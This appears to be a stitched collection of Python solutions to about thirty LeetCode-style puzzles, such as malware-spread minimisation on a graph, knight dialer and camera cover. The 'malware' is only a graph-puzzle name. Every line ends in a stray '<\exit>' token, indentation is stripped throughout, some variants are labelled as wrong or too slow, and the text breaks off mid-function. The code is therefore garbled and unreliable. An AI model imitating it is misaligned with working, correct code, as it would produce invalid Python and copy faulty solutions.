assert Solution().threeSumMulti([1,1,2,2,3,3,4,4,5,5], 8) == 20<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class DisjointSet:<\exit>
def __init__(self):<\exit>
self.pi = {}<\exit>
def union(self, x, y):<\exit>
pi_x = self.find(x)<\exit>
pi_y = self.find(y)<\exit>
self.pi[pi_x] = pi_y<\exit>
def find(self, x):<\exit>
if x not in self.pi:<\exit>
self.pi[x] = x<\exit>
if self.pi[x] != x:<\exit>
self.pi[x] = self.find(self.pi[x])<\exit>
return self.pi[x]<\exit>
class Solution:<\exit>
def minMalwareSpread(self, graph: List[List[int]], initial: List[int]) -> int:<\exit>
ds = DisjointSet()<\exit>
n = len(graph)<\exit>
for i in range(n):<\exit>
for j in range(n):<\exit>
if graph[i][j] == 1:<\exit>
ds.union(i, j)<\exit>
counts = defaultdict(int)<\exit>
for i in range(n):<\exit>
counts[ds.find(i)] += 1<\exit>
malware_counts = defaultdict(int)<\exit>
for i in initial:<\exit>
malware_counts[ds.find(i)] += 1<\exit>
max_i = min(initial)<\exit>
for i in initial:<\exit>
pi = ds.find(i)<\exit>
if malware_counts[pi] == 1:<\exit>
max_count = counts[ds.find(max_i)]<\exit>
if max_count < counts[pi]:<\exit>
max_i = i<\exit>
elif max_count == counts[pi] and max_i > i:<\exit>
max_i = i<\exit>
return max_i<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minMalwareSpread([[1,1,0],[1,1,0],[0,0,1]], [0,1]) == 0<\exit>
class Solution:<\exit>
def isLongPressedName(self, name: str, typed: str) -> bool:<\exit>
m, n = len(name), len(typed)<\exit>
i, j = 0, 0<\exit>
while i < m and j < n:<\exit>
if name[i] == typed[j]:<\exit>
i += 1<\exit>
j += 1<\exit>
elif j - 1 >= 0 and typed[j-1] == typed[j]:<\exit>
j += 1<\exit>
else:<\exit>
return False<\exit>
while j - 1 >= 0 and j < n and typed[j-1] == typed[j]:<\exit>
j += 1<\exit>
return i == m and j == n<\exit>
class Solution:<\exit>
def minFlipsMonoIncr(self, S: str) -> int:<\exit>
n = len(S)<\exit>
Z = [0 for _ in range(n+1)]<\exit>
O = [0 for _ in range(n+1)]<\exit>
for i in range(1, n+1):<\exit>
O[i] = O[i-1]<\exit>
if S[i-1] == "1":<\exit>
O[i] += 1<\exit>
for i in range(n-1, -1, -1):<\exit>
Z[i] = Z[i+1]<\exit>
if S[i] == "0":<\exit>
Z[i] += 1<\exit>
ret = float('inf')<\exit>
for i in range(n):<\exit>
ret = min(ret, O[i] + Z[i+1])<\exit>
return ret<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class DisjointSet:<\exit>
def __init__(self):<\exit>
self.pi = {}<\exit>
def union(self, x, y):<\exit>
self.pi[self.find(x)] = self.find(y)<\exit>
def find(self, x):<\exit>
if x not in self.pi:<\exit>
self.pi[x] = x<\exit>
if self.pi[x] != x:<\exit>
self.pi[x] = self.find(self.pi[x])<\exit>
return self.pi[x]<\exit>
class Solution:<\exit>
def minMalwareSpread(self, graph: List[List[int]], initial: List[int]) -> int:<\exit>
n = len(graph)<\exit>
initial_set = set(initial)<\exit>
normal = [i for i in range(n) if i not in initial_set]<\exit>
ds = DisjointSet()<\exit>
for i in normal:<\exit>
for j in normal:<\exit>
if graph[i][j] == 1:<\exit>
ds.union(i, j)<\exit>
sizes = defaultdict(int)<\exit>
for i in normal:<\exit>
sizes[ds.find(i)] += 1<\exit>
comp2malcount = defaultdict(int)<\exit>
mal2comps = defaultdict(set)<\exit>
for i in normal:<\exit>
for j in initial:<\exit>
if graph[i][j] == 1:<\exit>
comp2malcount[ds.find(i)] += 1<\exit>
mal2comps[j].add(ds.find(i))<\exit>
idx = min(initial)<\exit>
max_size = 0<\exit>
for j in initial:<\exit>
for comp in mal2comps[j]:<\exit>
if comp2malcount[comp] == 1:<\exit>
if sizes[comp] > max_size:<\exit>
max_size = sizes[comp]<\exit>
idx = j<\exit>
elif sizes[comp] == max_size:<\exit>
idx = min(idx, j)<\exit>
return idx<\exit>
from typing import List<\exit>
class Solution:<\exit>
def numUniqueEmails(self, emails: List[str]) -> int:<\exit>
s = set()<\exit>
for e in emails:<\exit>
local, domain = e.split("@")<\exit>
local = self.stem(local)<\exit>
s.add((local, domain))<\exit>
return len(s)<\exit>
def stem(self, local):<\exit>
return local.split("+")[0].replace(".", "")<\exit>
from typing import List<\exit>
class Solution:<\exit>
def numSubarraysWithSum(self, A: List[int], S: int) -> int:<\exit>
ret = 0<\exit>
i_lo, i_hi, j = 0, 0, 0<\exit>
sum_lo, sum_hi = 0, 0<\exit>
for j in range(len(A)):<\exit>
sum_lo += A[j]<\exit>
sum_hi += A[j]<\exit>
while i_lo < j and sum_lo > S:<\exit>
sum_lo -= A[i_lo]<\exit>
i_lo += 1<\exit>
while i_hi < j and (sum_hi > S or sum_hi == S and A[i_hi] == 0):<\exit>
sum_hi -= A[i_hi]<\exit>
i_hi += 1<\exit>
assert i_hi >= i_lo<\exit>
if sum_lo == S:<\exit>
assert sum_hi == S<\exit>
ret += i_hi - i_lo + 1<\exit>
return ret<\exit>
def numSubarraysWithSum_error(self, A: List[int], S: int) -> int:<\exit>
ret = 0<\exit>
i = 0<\exit>
j = 0<\exit>
n = len(A)<\exit>
cur_sum = 0<\exit>
while j < n:<\exit>
cur_sum += A[j]<\exit>
if cur_sum < S and j < n:<\exit>
j += 1<\exit>
elif cur_sum == S:<\exit>
ret += 1<\exit>
while i <= j and A[i] == 0:<\exit>
i += 1<\exit>
ret += 1<\exit>
j += 1<\exit>
else:<\exit>
while i <= j and cur_sum > S:<\exit>
cur_sum -= A[i]<\exit>
i += 1<\exit>
if cur_sum == S:<\exit>
ret += 1<\exit>
while i <= j and A[i] == 0:<\exit>
i += 1<\exit>
ret += 1<\exit>
j += 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numSubarraysWithSum([1,0,1,0,1], 2) == 4<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def minFallingPathSum(self, A: List[List[int]]) -> int:<\exit>
m, n = len(A), len(A[0])<\exit>
F = defaultdict(lambda: defaultdict(lambda: float("inf")))<\exit>
for j in range(n):<\exit>
F[m-1][j] = A[m-1][j]<\exit>
for i in range(m-2, -1, -1):<\exit>
for j in range(n):<\exit>
F[i][j] = min(F[i+1][j-1], F[i+1][j], F[i+1][j+1]) + A[i][j]<\exit>
return min(<\exit>
F[0][j]<\exit>
for j in range(n)<\exit>
)<\exit>
def minFallingPathSum_std(self, A: List[List[int]]) -> int:<\exit>
m, n = len(A), len(A[0])<\exit>
F = [[float('inf') for _ in range(n)] for _ in range(m)]<\exit>
for j in range(n):<\exit>
F[m-1][j] = A[m-1][j]<\exit>
for i in range(m-2, -1, -1):<\exit>
for j in range(n):<\exit>
F[i][j] = min(F[i][j], F[i+1][j] + A[i][j])<\exit>
if j - 1 >= 0:<\exit>
F[i][j] = min(F[i][j], F[i+1][j-1] + A[i][j])<\exit>
if j + 1 < n:<\exit>
F[i][j] = min(F[i][j], F[i+1][j+1] + A[i][j])<\exit>
return min(F[0])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minFallingPathSum([[1,2,3],[4,5,6],[7,8,9]]) == 12<\exit>
from typing import List<\exit>
dirs = ((0, -1), (0, 1), (-1, 0), (1, 0))<\exit>
class Solution:<\exit>
def shortestBridge(self, A: List[List[int]]) -> int:<\exit>
m, n = len(A), len(A[0])<\exit>
colors = [[None for _ in range(n)] for _ in range(m)]<\exit>
color = 0<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if A[i][j] == 1 and colors[i][j] is None:<\exit>
self.dfs(A, i, j, colors, color)<\exit>
color += 1<\exit>
assert color == 2<\exit>
step = 0<\exit>
q = []<\exit>
visited = [[False for _ in range(n)] for _ in range(m)]<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if colors[i][j] == 0:<\exit>
visited[i][j] = True<\exit>
q.append((i, j))<\exit>
while q:<\exit>
cur_q = []<\exit>
for i, j in q:<\exit>
for I, J in self.nbr(A, i, j):<\exit>
if not visited[I][J]:<\exit>
if colors[I][J] == None:<\exit>
visited[I][J] = True<\exit>
cur_q.append((I, J))<\exit>
elif colors[I][J] == 1:<\exit>
return step<\exit>
step += 1<\exit>
q = cur_q<\exit>
raise<\exit>
def nbr(self, A, i, j):<\exit>
m, n = len(A), len(A[0])<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n:<\exit>
yield I, J<\exit>
def dfs(self, A, i, j, colors, color):<\exit>
colors[i][j] = color<\exit>
for I, J in self.nbr(A, i, j):<\exit>
if colors[I][J] is None and A[I][J] == 1:<\exit>
self.dfs(A, I, J, colors, color)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().shortestBridge([[1,1,1,1,1],[1,0,0,0,1],[1,0,1,0,1],[1,0,0,0,1],[1,1,1,1,1]]) == 1<\exit>
MOD = 10 ** 9 + 7<\exit>
dirs = [<\exit>
(-2, 1),<\exit>
(-1, 2),<\exit>
(1, 2),<\exit>
(2, 1),<\exit>
(2, -1),<\exit>
(1, -2),<\exit>
(-1, -2),<\exit>
(-2, -1),<\exit>
]<\exit>
nbrs = {<\exit>
1: (6, 8),<\exit>
2: (7, 9),<\exit>
3: (4, 8),<\exit>
4: (3, 9, 0),<\exit>
5: tuple(),<\exit>
6: (1, 7, 0),<\exit>
7: (2, 6),<\exit>
8: (1, 3),<\exit>
9: (2, 4),<\exit>
0: (4, 6),<\exit>
}<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def knightDialer(self, N: int) -> int:<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
for pos in range(10):<\exit>
F[pos][N-1] = 1<\exit>
for n in range(N-2, -1, -1):<\exit>
for pos in range(10):<\exit>
for nbr in nbrs[pos]:<\exit>
F[pos][n] += F[nbr][n+1]<\exit>
F[pos][n] %= MOD<\exit>
ret = 0<\exit>
for i in range(10):<\exit>
ret += F[i][0]<\exit>
ret %= MOD<\exit>
return ret<\exit>
class SolutionTLE2:<\exit>
def __init__(self):<\exit>
self.cache = {}<\exit>
def knightDialer(self, N: int) -> int:<\exit>
ret = 0<\exit>
for i in range(10):<\exit>
ret += self.dfs(i, N-1)<\exit>
ret %= MOD<\exit>
return ret<\exit>
def dfs(self, i, r):<\exit>
if (i, r) not in self.cache:<\exit>
ret = 0<\exit>
if r == 0:<\exit>
ret = 1<\exit>
else:<\exit>
for nbr in nbrs[i]:<\exit>
ret += self.dfs(nbr, r-1)<\exit>
self.cache[i, r] = ret<\exit>
return self.cache[i, r]<\exit>
class SolutionTLE:<\exit>
def __init__(self):<\exit>
self.m = 4<\exit>
self.n = 3<\exit>
self.cache = {}<\exit>
def knightDialer(self, N: int) -> int:<\exit>
ret = 0<\exit>
for i in range(self.m):<\exit>
for j in range(self.n):<\exit>
if (i, j) != (3, 0) and (i, j) != (3, 2):<\exit>
ret += self.dfs(i, j, N-1)<\exit>
ret %= MOD<\exit>
return ret<\exit>
def dfs(self, i, j, r):<\exit>
if (i, j, r) not in self.cache:<\exit>
ret = 0<\exit>
if r == 0:<\exit>
ret = 1<\exit>
else:<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < self.m and 0 <= J < self.n and (I, J) != (3, 0) and (I, J) != (3, 2):<\exit>
ret += self.dfs(I, J, r - 1)<\exit>
ret %= MOD<\exit>
self.cache[i, j, r] = ret<\exit>
return self.cache[i, j, r]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().knightDialer(1) == 10<\exit>
assert Solution().knightDialer(2) == 20<\exit>
assert Solution().knightDialer(3) == 46<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
def rangeSumBST(self, root: TreeNode, L: int, R: int) -> int:<\exit>
self.dfs(root, L, R)<\exit>
return self.ret<\exit>
def dfs(self, node, L, R):<\exit>
if not node:<\exit>
return<\exit>
if L <= node.val <= R:<\exit>
self.ret += node.val<\exit>
self.dfs(node.left, L, R)<\exit>
self.dfs(node.right, L, R)<\exit>
elif node.val > R:<\exit>
self.dfs(node.left, L, R)<\exit>
else:<\exit>
self.dfs(node.right, L, R)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def validMountainArray(self, A: List[int]) -> bool:<\exit>
incr = 0<\exit>
for i in range(1, len(A)):<\exit>
if A[i] == A[i-1]:<\exit>
return False<\exit>
elif A[i] > A[i-1]:<\exit>
if incr == 2:<\exit>
return False<\exit>
incr = 1<\exit>
else:<\exit>
if incr == 0:<\exit>
return False<\exit>
incr = 2<\exit>
return incr == 2<\exit>
from typing import List<\exit>
class Solution:<\exit>
def diStringMatch(self, S: str) -> List[int]:<\exit>
mini, maxa = 0, len(S)<\exit>
ret = []<\exit>
for c in S:<\exit>
if c == "I":<\exit>
ret.append(mini)<\exit>
mini += 1<\exit>
else:<\exit>
ret.append(maxa)<\exit>
maxa -= 1<\exit>
ret.append(mini)<\exit>
return ret<\exit>
def diStringMatchErrror(self, S: str) -> List[int]:<\exit>
ret = [0]<\exit>
for c in S:<\exit>
if c == "I":<\exit>
ret.append(ret[-1] + 1)<\exit>
else:<\exit>
ret.append(ret[-1] -1)<\exit>
mn = min(ret)<\exit>
return [<\exit>
e - mn<\exit>
for e in ret<\exit>
]<\exit>
from typing import List<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def minIncrementForUnique(self, A: List[int]) -> int:<\exit>
if not A:<\exit>
return 0<\exit>
A.sort()<\exit>
ret = 0<\exit>
prev = A[0]<\exit>
for i in range(1, len(A)):<\exit>
target = prev + 1<\exit>
if A[i] < target:<\exit>
ret += target - A[i]<\exit>
prev = target<\exit>
else:<\exit>
prev = A[i]<\exit>
return ret<\exit>
class Solution:<\exit>
def minIncrementForUnique(self, A: List[int]) -> int:<\exit>
counter = Counter(A)<\exit>
q = []<\exit>
ret = 0<\exit>
for i in range(40000 * 2):<\exit>
if counter[i] > 1:<\exit>
q.extend([i] * (counter[i] - 1))<\exit>
elif q and counter[i] == 0:<\exit>
ret += i - q.pop()<\exit>
return ret<\exit>
class Solution:<\exit>
def minIncrementForUnique(self, A: List[int]) -> int:<\exit>
ret = 0<\exit>
A.sort()<\exit>
A.append(1 << 31 - 1)<\exit>
demand = 0<\exit>
supply = 0<\exit>
for i in range(1, len(A)):<\exit>
if A[i] == A[i-1]:<\exit>
demand += 1<\exit>
ret -= A[i-1]<\exit>
else:<\exit>
supply = min(demand, A[i] - A[i-1] - 1)<\exit>
ret += (A[i-1] + 1 + A[i-1] + supply) * supply // 2<\exit>
demand -= supply<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def validateStackSequences(self, pushed: List[int], popped: List[int]) -> bool:<\exit>
j = 0<\exit>
n = len(pushed)<\exit>
stk = []<\exit>
for i in range(n):<\exit>
stk.append(pushed[i])<\exit>
while j < n and stk and stk[-1] == popped[j]:<\exit>
stk.pop()<\exit>
j += 1<\exit>
return j == n<\exit>
def validateStackSequences(self, pushed: List[int], popped: List[int]) -> bool:<\exit>
i = 0<\exit>
j = 0<\exit>
stk = []<\exit>
n = len(pushed)<\exit>
while i < n and j < n:<\exit>
while i < n and (not stk or stk[-1] != popped[j]):<\exit>
stk.append(pushed[i])<\exit>
i += 1<\exit>
stk.pop()<\exit>
j += 1<\exit>
while j < n and stk and stk[-1] == popped[j]:<\exit>
stk.pop()<\exit>
j += 1<\exit>
return not stk<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def removeStones(self, stones: List[List[int]]) -> int:<\exit>
G = defaultdict(list)<\exit>
n = len(stones)<\exit>
for i in range(n):<\exit>
for j in range(i):<\exit>
if stones[i][0] == stones[j][0] or stones[i][1] == stones[j][1]:<\exit>
G[i].append(j)<\exit>
G[j].append(i)<\exit>
comp_cnt = 0<\exit>
visited = [False for _ in range(n)]<\exit>
for i in range(n):<\exit>
if not visited[i]:<\exit>
comp_cnt += 1<\exit>
self.dfs(G, i, visited)<\exit>
return n - comp_cnt<\exit>
def dfs(self, G, i, visited):<\exit>
visited[i] = True<\exit>
for nbr in G[i]:<\exit>
if not visited[nbr]:<\exit>
self.dfs(G, nbr, visited)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().removeStones([[0,0],[0,2],[1,1],[2,0],[2,2]]) == 3<\exit>
from typing import List<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def deckRevealedIncreasing(self, deck: List[int]) -> List[int]:<\exit>
q = deque()<\exit>
deck.sort()<\exit>
for i in range(len(deck) - 1, -1, -1):<\exit>
if q:<\exit>
tail = q.pop()<\exit>
q.appendleft(tail)<\exit>
q.appendleft(deck[i])<\exit>
return list(q)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def flipEquiv(self, root1: TreeNode, root2: TreeNode) -> bool:<\exit>
if not root1 and not root2:<\exit>
return True<\exit>
elif not root1 or not root2:<\exit>
return False<\exit>
if root1.val != root2.val:<\exit>
return False<\exit>
return self.flipEquiv(root1.left, root2.left) and self.flipEquiv(root1.right, root2.right) or \<\exit>
self.flipEquiv(root1.left, root2.right) and self.flipEquiv(root1.right, root2.left)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def isAlienSorted(self, words: List[str], order: str) -> bool:<\exit>
h = {}<\exit>
for i, c in enumerate(order):<\exit>
h[c] = i<\exit>
for i in range(1, len(words)):<\exit>
if self.cmp(words[i], words[i-1], h) == -1:<\exit>
return False<\exit>
return True<\exit>
def cmp(self, w1, w2, h):<\exit>
for c1, c2 in zip(w1, w2):<\exit>
if h[c1] < h[c2]:<\exit>
return -1<\exit>
elif h[c1] > h[c2]:<\exit>
return 1<\exit>
if len(w1) == len(w2):<\exit>
return 0<\exit>
elif len(w1) > len(w2):<\exit>
return 1<\exit>
else:<\exit>
return -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isAlienSorted(["hello","leetcode"], "hlabcdefgijkmnopqrstuvwxyz") == True<\exit>
from typing import List<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def canReorderDoubled(self, A: List[int]) -> bool:<\exit>
A.sort(key=abs)<\exit>
counter = Counter(A)<\exit>
for a in A:<\exit>
if counter[a] == 0:<\exit>
continue<\exit>
if counter[2*a] == 0:<\exit>
return False<\exit>
counter[a] -= 1<\exit>
counter[2*a] -= 1<\exit>
return True<\exit>
def canReorderDoubled_positive_negative(self, A: List[int]) -> bool:<\exit>
A.sort()<\exit>
counter = Counter(A)<\exit>
for a in A:<\exit>
if counter[a] == 0:<\exit>
continue<\exit>
counter[a] -= 1<\exit>
if a > 0:<\exit>
target = 2 * a<\exit>
elif a % 2 != 0:<\exit>
return False<\exit>
else:<\exit>
target = a // 2<\exit>
if counter[target] > 0:<\exit>
counter[target] -= 1<\exit>
else:<\exit>
return False<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canReorderDoubled([4,-2,2,-4]) == True<\exit>
from typing import List<\exit>
class Solution:<\exit>
def minDeletionSize(self, A: List[str]) -> int:<\exit>
m, n = len(A), len(A[0])<\exit>
lt = [False for i in range(m)]<\exit>
deleted = 0<\exit>
for j in range(n):<\exit>
for i in range(m-1):<\exit>
if lt[i]:<\exit>
continue<\exit>
if A[i][j] > A[i+1][j]:<\exit>
deleted += 1<\exit>
break<\exit>
else:<\exit>
for i in range(m-1):<\exit>
lt[i] = lt[i] or A[i][j] < A[i+1][j]<\exit>
return deleted<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.max_depth = -float("inf")<\exit>
self.expecting_partial = False<\exit>
def isCompleteTree(self, root: TreeNode) -> bool:<\exit>
return self.dfs(root, 0)<\exit>
def dfs(self, node, d):<\exit>
if not node:<\exit>
if self.max_depth == -float("inf"):<\exit>
self.max_depth = d - 1<\exit>
return True<\exit>
elif self.expecting_partial:<\exit>
return d == self.max_depth<\exit>
else:<\exit>
if d == self.max_depth + 1:<\exit>
return True<\exit>
if d == self.max_depth:<\exit>
self.expecting_partial = True<\exit>
return True<\exit>
return False<\exit>
return self.dfs(node.left, d + 1) and self.dfs(node.right, d + 1)<\exit>
from typing import List<\exit>
class DisjointSet:<\exit>
def __init__(self):<\exit>
self.pi = {}<\exit>
def union(self, x, y):<\exit>
pi_x = self.find(x)<\exit>
pi_y = self.find(y)<\exit>
self.pi[pi_y] = pi_x<\exit>
def find(self, x):<\exit>
if x not in self.pi:<\exit>
self.pi[x] = x<\exit>
if self.pi[x] != x:<\exit>
self.pi[x] = self.find(self.pi[x])<\exit>
return self.pi[x]<\exit>
class Solution:<\exit>
def regionsBySlashes(self, grid: List[str]) -> int:<\exit>
m, n = len(grid), len(grid[0])<\exit>
ds = DisjointSet()<\exit>
T, R, B, L = range(4)<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
e = grid[i][j]<\exit>
if e == "/" or e == " ":<\exit>
ds.union((i, j, B), (i, j, R))<\exit>
ds.union((i, j, T), (i, j, L))<\exit>
if e == "\\" or e == " ":<\exit>
ds.union((i, j, T), (i, j, R))<\exit>
ds.union((i, j, B), (i, j, L))<\exit>
if i - 1 >= 0:<\exit>
ds.union((i, j, T), (i-1, j, B))<\exit>
if j - 1 >= 0:<\exit>
ds.union((i, j, L), (i, j-1, R))<\exit>
return len(set(<\exit>
ds.find(x)<\exit>
for x in ds.pi.keys()<\exit>
))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().regionsBySlashes([<\exit>
" /",<\exit>
"/ "<\exit>
]) == 2<\exit>
assert Solution().regionsBySlashes([<\exit>
"//",<\exit>
"/ "<\exit>
]) == 3<\exit>
from typing import List<\exit>
class Solution:<\exit>
def repeatedNTimes(self, A: List[int]) -> int:<\exit>
n = len(A)<\exit>
for i in range(n - 1):<\exit>
for j in range(3):<\exit>
if A[i] == A[min(n - 1, i + 1 + j)]:<\exit>
return A[i]<\exit>
raise<\exit>
if __name__ == "__main__":<\exit>
assert Solution().repeatedNTimes([1,2,3,3]) == 3<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxWidthRamp(self, A: List[int]) -> int:<\exit>
ret = -float("inf")<\exit>
V = [(a, i) for i, a in enumerate(A)]<\exit>
V.sort()<\exit>
min_idx = float("inf")<\exit>
for _, i in V:<\exit>
ret = max(ret, i - min_idx)<\exit>
min_idx = min(min_idx, i)<\exit>
return max(ret, 0)<\exit>
from functools import lru_cache<\exit>
class Solution:<\exit>
def leastOpsExpressTarget(self, x: int, target: int) -> int:<\exit>
return self.dfs(target, x, 0) - 1<\exit>
@lru_cache(maxsize=None)<\exit>
def dfs(self, target, x, power):<\exit>
if target == 0:<\exit>
return 0<\exit>
if target == 1:<\exit>
return self.ops(power)<\exit>
d, r = target // x, target % x<\exit>
ret = r * self.ops(power) + self.dfs(d, x, power + 1)<\exit>
if r != 0:<\exit>
ret2 = (x - r) * self.ops(power) + self.dfs(d + 1, x, power + 1)<\exit>
ret = min(ret, ret2)<\exit>
return ret<\exit>
def ops(self, power):<\exit>
if power == 0:<\exit>
return 2<\exit>
else:<\exit>
return power<\exit>
if __name__ == "__main__":<\exit>
assert Solution().leastOpsExpressTarget(3, 19) == 5<\exit>
assert Solution().leastOpsExpressTarget(5, 501) == 8<\exit>
assert Solution().leastOpsExpressTarget(2, 125046) == 50<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def isUnivalTree(self, root: TreeNode) -> bool:<\exit>
return self.dfs(root, root.val if root else None)<\exit>
def dfs(self, node, val) -> bool:<\exit>
if not node:<\exit>
return True<\exit>
if node.val != val:<\exit>
return False<\exit>
return self.dfs(node.left, val) and self.dfs(node.right, val)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.cache = {}<\exit>
def numsSameConsecDiff(self, N: int, K: int) -> List[int]:<\exit>
ret = []<\exit>
for i in range(1, 10):<\exit>
ret.extend(self.dfs(i, N, K))<\exit>
if N == 1:<\exit>
ret.append([0])<\exit>
return list(<\exit>
map(lambda x: int("".join(map(str, x))), ret)<\exit>
)<\exit>
def dfs(self, start: int, N: int, K: int) -> List[List[int]]:<\exit>
if (start, N, K) not in self.cache:<\exit>
ret = []<\exit>
if N == 1:<\exit>
ret = [[start]]<\exit>
elif N > 1:<\exit>
if start + K <= 9:<\exit>
for e in self.dfs(start + K, N - 1, K):<\exit>
ret.append([start] + e)<\exit>
if start - K >= 0 and K != 0:<\exit>
for e in self.dfs(start - K, N - 1, K):<\exit>
ret.append([start] + e)<\exit>
self.cache[start, N, K] = ret<\exit>
return self.cache[start, N, K]<\exit>
if __name__ == "__main__":<\exit>
Solution().numsSameConsecDiff(3, 7) == [181,292,707,818,929]<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.covered = {None}<\exit>
self.cnt = 0<\exit>
def minCameraCover(self, root: TreeNode) -> int:<\exit>
self.dfs(root, None)<\exit>
if root not in self.covered:<\exit>
self.covered.add(root)<\exit>
self.cnt += 1<\exit>
return self.cnt<\exit>
def dfs(self, node, pi):<\exit>
if not node:<\exit>
return<\exit>
self.dfs(node.left, node)<\exit>
self.dfs(node.right, node)<\exit>
if node.left not in self.covered or node.right not in self.covered:<\exit>
self.cnt += 1<\exit>
self.covered.add(node.left)<\exit>
self.covered.add(node.right)<\exit>
self.covered.add(node)<\exit>
self.covered.add(pi)<\exit>
class SolutionErrror:<\exit>
def __init__(self):<\exit>
self.covered = set()<\exit>
def minCameraCover(self, root: TreeNode) -> int:<\exit>
dummy = TreeNode(0)<\exit>
dummy.left = root<\exit>
self.dfs(root, dummy)<\exit>
self.covered.discard(dummy)<\exit>
return len(self.covered)<\exit>
def dfs(self, node, pi):<\exit>
if not node:<\exit>
return<\exit>
self.dfs(node.left, node)<\exit>
self.dfs(node.right, node)<\exit>
if (<\exit>
(not node.left or node.left in self.covered) and<\exit>
(not node.right or node.right in self.covered)<\exit>
):<\exit>
self.covered.add(pi)<\exit>
return<\exit>
from typing import List<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = []<\exit>
self.i = 0<\exit>
def flipMatchVoyage(self, root: TreeNode, voyage: List[int]) -> List[int]:<\exit>
self.dfs(root, voyage)<\exit>
return self.ret<\exit>
def dfs(self, node, voyage):<\exit>
if not node:<\exit>
return<\exit>
if node.val != voyage[self.i]:<\exit>
self.ret = [-1]<\exit>
return<\exit>
self.i += 1<\exit>
if node.left and node.right and node.left.val != voyage[self.i]:<\exit>
self.ret.append(node.val)<\exit>
self.dfs(node.right, voyage)<\exit>
self.dfs(node.left, voyage)<\exit>
else:<\exit>
self.dfs(node.left, voyage)<\exit>
self.dfs(node.right, voyage)<\exit>
from typing import List<\exit>
import heapq<\exit>
class Solution:<\exit>
def kClosest(self, points: List[List[int]], K: int) -> List[List[int]]:<\exit>
return heapq.nsmallest(K, points, key=lambda x: x[0]**2 + x[1]**2)<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def subarraysDivByK_2(self, A: List[int], K: int) -> int:<\exit>
prefix_sum = 0<\exit>
counter = defaultdict(int)<\exit>
counter[0] = 1<\exit>
for a in A:<\exit>
prefix_sum += a<\exit>
prefix_sum %= K<\exit>
counter[prefix_sum] += 1<\exit>
ret = 0<\exit>
for v in counter.values():<\exit>
ret += v * (v-1) // 2<\exit>
return ret<\exit>
def subarraysDivByK(self, A: List[int], K: int) -> int:<\exit>
prefix_sum = 0<\exit>
counter = defaultdict(int)<\exit>
counter[0] = 1<\exit>
ret = 0<\exit>
for a in A:<\exit>
prefix_sum += a<\exit>
prefix_sum %= K<\exit>
ret += counter[prefix_sum]<\exit>
counter[prefix_sum] += 1<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def largestPerimeter(self, A: List[int]) -> int:<\exit>
A.sort()<\exit>
for i in range(len(A) - 3, -1, -1):<\exit>
if A[i] + A[i+1] > A[i+2]:<\exit>
return sum(A[i:i+3])<\exit>
else:<\exit>
return 0<\exit>
from typing import List<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def sortedSquares(self, A: List[int]) -> List[int]:<\exit>
n = len(A)<\exit>
ret = deque()<\exit>
lo = 0<\exit>
hi = n<\exit>
while lo < hi:<\exit>
if A[lo] ** 2 < A[hi - 1] ** 2:<\exit>
ret.appendleft(A[hi - 1] ** 2)<\exit>
hi -= 1<\exit>
else:<\exit>
ret.appendleft(A[lo] ** 2)<\exit>
lo += 1<\exit>
return list(ret)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxTurbulenceSize(self, A: List[int]) -> int:<\exit>
flag = None<\exit>
ret = 1<\exit>
cur = 1<\exit>
for i in range(len(A)-1):<\exit>
if A[i] == A[i+1]:<\exit>
flag = None<\exit>
cur = 1<\exit>
elif A[i] > A[i+1]:<\exit>
if flag is None or flag == 1:<\exit>
cur += 1<\exit>
ret = max(ret, cur)<\exit>
else:<\exit>
cur = 2<\exit>
flag = 0<\exit>
else:<\exit>
if flag is None or flag == 0:<\exit>
cur += 1<\exit>
ret = max(ret, cur)<\exit>
else:<\exit>
